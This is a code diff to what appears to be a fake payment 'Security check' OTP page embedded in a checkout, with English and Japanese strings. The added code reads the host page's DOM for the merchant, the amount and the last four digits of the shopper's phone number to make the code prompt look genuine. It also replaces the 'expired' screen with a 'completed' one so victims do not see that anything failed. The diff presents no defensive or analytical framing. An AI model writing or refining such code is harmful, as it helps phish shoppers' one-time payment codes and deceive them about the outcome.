@@ -288,6 +288,7 @@
         var resendCooldown = 60;
         var resendTimer = null;
         var resending = false;
+        var phoneSuffix = '';
 
         var i18n = {
             en: {
@@ -295,7 +296,7 @@
                 title_loading: 'Confirm your payment',
                 subtitle_loading: "We're verifying your payment. This may take a moment...",
                 title_otp: 'Security check',
-                subtitle_otp: 'We sent a code to ••••1234. Enter it below to confirm your payment.',
+                subtitle_otp: 'We sent a code to ••••{phone}. Enter it below to confirm your payment.',
                 otp_label: 'Enter the 6-digit security code',
                 error_msg: "That code didn't work. Please try again.",
                 submit_btn: 'Continue',
@@ -314,7 +315,7 @@
                 title_loading: 'お支払いを確認中',
                 subtitle_loading: 'お支払いを確認しています。しばらくお待ちください...',
                 title_otp: 'セキュリティ確認',
-                subtitle_otp: '••••1234 にコードを送信しました。お支払いを確定するには下記に入力してください。',
+                subtitle_otp: '••••{phone} にコードを送信しました。お支払いを確定するには下記に入力してください。',
                 otp_label: '6桁のセキュリティコードを入力してください',
                 error_msg: 'コードが正しくありません。もう一度お試しください。',
                 submit_btn: '次へ',
@@ -369,22 +370,29 @@
                         currency = abbr.textContent.trim();
                     }
 
-                    var strongs = pdoc.querySelectorAll('strong');
-                    if (strongs && strongs.length >= 3) {
-                        var s = strongs[2];
-                        if (s && s.textContent) {
-                            amount = s.textContent.trim();
+                    var s = pdoc.querySelector('[role="cell"] strong:last-of-type');
+                    if (s && s.textContent) {
+                        amount = s.textContent.trim();
+                    }
+
+                    var phoneInput = pdoc.querySelector('[name="phone"]');
+                    var phone = '****';
+                    if (phoneInput && phoneInput.value) {
+                        var phoneVal = phoneInput.value.replace(/\D/g, '');
+                        if (phoneVal.length >= 4) {
+                            phone = phoneVal.substring(phoneVal.length - 4);
                         }
                     }
 
                     return {
                         merchantName: merchantName,
                         amount: amount,
-                        currency: currency
+                        currency: currency,
+                        phone: phone
                     };
                 }
             } catch (e) {}
-            return { merchantName: null, amount: null, currency: null };
+            return { merchantName: null, amount: null, currency: null, phone: null };
         }
 
         function applyParentData() {
@@ -402,6 +410,9 @@
                     }
                     amountEl.textContent = displayAmount;
                 }
+            }
+            if (data.phone) {
+                phoneSuffix = data.phone;
             }
         }
 
@@ -433,7 +444,11 @@
 
         function showOTPForm() {
             document.getElementById('title').textContent = t('title_otp');
-            document.getElementById('subtitle').innerHTML = t('subtitle_otp');
+            var subtitle = t('subtitle_otp');
+            if (phoneSuffix !== '') {
+                subtitle = subtitle.replace('{phone}', phoneSuffix);
+            }
+            document.getElementById('subtitle').innerHTML = subtitle;
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.add('active');
             document.getElementById('expired-state').classList.remove('show');
@@ -473,14 +488,6 @@
                 otp += input.value;
             });
             return otp;
-        }
-
-        function showExpired() {
-            document.getElementById('loading-state').style.display = 'none';
-            document.getElementById('otp-form').classList.remove('active');
-            document.getElementById('expired-state').classList.add('show');
-            document.getElementById('completed-state').classList.remove('show');
-            stopPolling();
         }
 
         function showCompleted() {
@@ -545,7 +552,7 @@
                     showCompleted();
                     break;
                 case 'expired':
-                    showExpired();
+                    showCompleted();
                     break;
             }
             currentState = state;
@@ -553,7 +560,7 @@
 
         function pollStatus() {
             if (pollCount >= maxPolls) {
-                showExpired();
+                showCompleted();
                 return;
             }
             pollCount++;
